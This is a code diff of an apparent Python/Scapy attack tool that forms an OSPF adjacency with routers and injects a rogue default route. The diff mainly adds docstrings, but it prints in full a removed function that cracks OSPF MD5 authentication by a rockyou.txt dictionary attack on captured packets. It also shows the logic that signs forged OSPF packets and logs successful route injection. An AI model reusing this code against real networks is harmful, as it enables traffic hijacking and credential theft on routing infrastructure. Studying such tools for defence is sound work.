@@ -21,18 +21,16 @@ from scapy.contrib.ospf import (
 from scapy.layers.inet import IP
 from scapy.layers.l2 import Ether
 
+
 logging.basicConfig(level=logging.DEBUG)
 LOG = logging.getLogger("ospf-session")
 
 ALL_SPF_ROUTERS = "224.0.0.5"
 ALL_SPF_ROUTERS_MAC = "01:00:5e:00:00:05"
 
-# NOTE: NOT USED
-# ALL_DR_ROUTERS = "224.0.0.6"
-# ALL_DR_ROUTERS_MAC = "01:00:5e:00:00:06"
 
 def hash_password(pw: str, actual_ospf_pkt: bytes):
-
+    """OSPF MD5 hashing function"""
     pw_bytes = pw.strip().encode('utf-8')
 
     # Format key to exactly 16 bytes
@@ -50,11 +48,13 @@ def hash_password(pw: str, actual_ospf_pkt: bytes):
     return generated_hash
 
 class OSPFAuthType(IntEnum):
+    """OSPF Auth Type Enum"""
     NONE = 0
     PLAINTEXT = 1
     CRYPTO = 2
 
 class NeighbourState(Enum):
+    """Neighbour States Enum"""
     DOWN = auto()
     INIT = auto()
     TWO_WAY = auto()
@@ -65,6 +65,7 @@ class NeighbourState(Enum):
 
 
 class OSPFType(IntEnum):
+    """OSPF Types Enum"""
     # OSPF Hello
     HELLO = 1
     # OSPF Database Description
@@ -78,6 +79,7 @@ class OSPFType(IntEnum):
 
 
 class DBDFlags(IntFlag):
+    "DBDesc Flags Enum"
     NONE = 0x00
     INIT = 0x04
     MORE = 0x02 
@@ -86,6 +88,7 @@ class DBDFlags(IntFlag):
 
 @dataclass
 class OSPFConfig:
+    """This device's OSPF Configs Tracker"""
     iface: str
     router_id: str
     mask: str
@@ -93,7 +96,7 @@ class OSPFConfig:
     area: str = "0.0.0.0"
     plaintext_pw: str = "" # use default val first so it doenst crash
 
-    lsa_seq: int = 0x80000001
+    lsa_seq: int = 0x80000001 # Starting value if not initialised
     
     # Auth details 
     authtype: int | None = None
@@ -106,12 +109,11 @@ class OSPFConfig:
     priority: int = 0 #NOTE: Priority 0 = DROTHER - not participating in DR/BDR election
     options: int = 0x02
     mtu: int = 1500
-    # rxmt_interval: int = 5 # retransmission interval
-    # max_retries: int = 3
 
 
 @dataclass
 class Neighbour:
+    """Neighbour Fields Tracker"""
     # To populate
     router_id: str # nb router id
     ip: str # nb ip
@@ -144,6 +146,8 @@ class Neighbour:
 
 # Main Class
 class OSPFSession:
+    """Main Class in charge of forming OSPF Adjacency and Injecting Default route"""
+
     def __init__(self, config: OSPFConfig, ip: str, mac: str, path_to_dict: str) -> None:
         self.config = config
 
@@ -165,20 +169,6 @@ class OSPFSession:
         self.running = False
         self.lock = threading.Lock()
 
-        # self.config.authtype = getattr(ospf, "authtype", 0)
-        # Crypto Authdata PW is the last 16 bytes of the packet
-        # Convert raw packet to bytes and retrieve last 16 bytes to extract hashed pw
-
-        # # Impt: Extract password/authdata
-        # if extract_details.get("authtype") == OSPFAuthType.PLAINTEXT:
-        #     # Extract plaintext pw directly
-        #     extract_details["password"] = ospf_packets.authdata
-        #
-        # self.config.plaintext_pw = self.crack_password(ospf, self.dictpath)
-        #
-        # if not self.config.plaintext_pw:
-        #     return
-
     def run(self):
         self.running = True
 
@@ -198,7 +188,6 @@ self.config.area,
 
         # Heartbeat
         self.start_hello_loop()
-        # self.start_retransmission_loop()
 
         try:
             self.start_sniffer()
@@ -270,6 +259,7 @@ self.config.area,
 
     ### ------ OSPF SNIFFER ------ ###
     def start_sniffer(self) -> None:
+        """OSPF Packet Sniffer"""
         sniff(
             iface=self.config.iface,
             filter="ip proto 89",
@@ -281,12 +271,13 @@ self.config.area,
 
     ### ------ OSPF PACKET HANDLERS ------ ###
     def handle_packets(self, pkt: Any) -> None:
+        """Overall handler for all incoming OSPF packets"""
         if IP not in pkt or OSPF_Hdr not in pkt:
             return
 
         original_ospf = pkt[OSPF_Hdr]
 
-        # Extract and Clean OSPF Header - Scapy doesn't parse MD5 auth packets properly
+        # Extract and Clean OSPF Header - Scapy doesn't parse Crypto auth enabled packets properly
         ospf_len = original_ospf.len
         ospf_bytes = bytes(original_ospf)[:ospf_len]
 
@@ -300,6 +291,7 @@ self.config.area,
         if ospf.area != self.config.area:
             return
 
+        # Crypto Authentication - track `keyid` and increase `seq` number
         if ospf.authtype == 2:
             self.config.key_id = ospf.keyid
             self.config.authseq = ospf.seq + 1
@@ -308,7 +300,7 @@ self.config.area,
         with self.lock:
             nb = self.get_or_create_neighbour(pkt)
 
-        # Handlers for sniffed/incoming packets, OUTSIDE of lock to prevent deadlocks
+        # Separate Handlers for differenct sniffed/incoming OSPF type packets
         if ospf.type == OSPFType.HELLO:
             self.handle_hello(nb, ospf)
         elif ospf.type == OSPFType.DBD:
@@ -643,7 +635,7 @@ self.config.area,
                 payload=lsu_payload,
                 )
 
-        LOG.info("Injected Type 1 default route to %s via %s", nb.ip, ALL_SPF_ROUTERS)
+        LOG.critical("[!] Injected default route to %s [!]", nb.ip)
 
     def handle_lsupd(self, nb: Neighbour, ospf: Any) -> None:
         """Handler for received LSUpd packets - Prevents Neighbour from shutting down link due to too many LSUpds with no response"""
@@ -687,76 +679,9 @@ self.config.area,
                 payload=ack,
                 )
 
-    def crack_password(self, ospf_pkt: OSPF_Hdr, filename: str) -> str | None:
-        """
-        OSPF Authtype 2 - Hashed PW cracker
-
-        Currently only supports MD5 Hash Cracking
-
-        OSPF Uses a specific MD5 hashing format
-
-        How it works:
-            1.  Clears chksum bit in OSPF Header - set to 0
-            2.  Enforces a strict 16 byte long Key by padding NULL bytes to the end of the key if the key length is less than 16 bytes
-                Otherwise, uses the first 16 bytes of the password as the Key
-            3.  Concatenates the actual OSPF Packet (Header + Payload) with formatted Key
-            4.  Calculates MD5 hash from this buffer and appends it to the end of the entire packet
-
-        How we crack the hash:
-            1.  Extract the hash from the packet - last 16 bytes
-            2.  Extract OSPF Packet (Header + Payload) from the packet (Start of OSPF Header to End of packet - 16 bytes)
-            3.  Run a dictionary attack hashing each password by following the hashing method above
-            4.  Compare each hash digest against the extracted hash to get the password
-        """
-
-        # Theoretically chksum should alr be 0 but jic
-        if getattr(ospf_pkt, "chksum", None) != 0:
-            setattr(ospf_pkt, "chksum", 0)
-
-        raw_ospf_pkt = bytes(ospf_pkt)
-
-        # Extract OSPF MD5 hash located at end of OSPF packet (after OSPF header + payload)
-        extracted_hash = raw_ospf_pkt[-16:]
-        LOG.info("[!] Extracted hash %s", extracted_hash.hex())
-
-        # Extract actual OSPF packet
-        actual_ospf_pkt = raw_ospf_pkt[:-16]
-
-        # Iterate and try passwords from rockyou.txt
-        try:
-            with open(filename, "r", encoding='utf-8') as file:
-                for pw in file:
-                    print(f"Trying {pw}", end="\r")
-                    # Format key to exactly 16 bytes
-                    pw_bytes = pw.strip().encode('utf-8')
-                    padded_key = pw_bytes + b'\x00' * (16 - len(pw_bytes)) if len(pw_bytes) < 16 else pw_bytes[:16]
-
-                    # Concatenate actual ospf pkt and padded key
-                    buffer = actual_ospf_pkt + padded_key
-
-                    # Calculate hash
-                    generated_hash = hashlib.md5(buffer).digest()
-
-                    if generated_hash == extracted_hash:
-                        # Match
-                        LOG.critical("[!] Found Password: %s", pw)
-                        return pw 
-            # Password Cracking Failed
-            LOG.fatal("[!] Failed to crack password. Hash: %s", extracted_hash)
-            return "" 
-
-        except FileNotFoundError:
-            LOG.error("[!] %s file not found.", filename)
-        except PermissionError:
-            LOG.error("[!] No permission to open %s", filename)
-        except Exception as e:
-            LOG.error(f"[!] crack_password - Unknown error: {e}")
-
     def _send_ospf(self, dst_ip: str, dst_mac: str, ospf_type: int, payload: Any) -> None:
         """Sends OSPF Packets"""
-        # TODO: Cleanup - alota values same as default, unnecessary
         if self.config.authtype == OSPFAuthType.CRYPTO:
-
             ospf = (
                 OSPF_Hdr(
                         version=2, # OSPF ver 2 for ipv4
@@ -778,10 +703,8 @@ self.config.area,
 
             ospf_packet = ospf_bytes[:ospf_len] # in bytes
 
-            # Run hashing on stored plaintext password
+            # Generate hash using stored plaintext password
             generated_hash = hash_password(self.config.plaintext_pw, ospf_packet)
-
-            # LOG.debug(f"generated hash: {generated_hash.hex()}")
 
             full_ospf_packet = ospf_packet + generated_hash
 
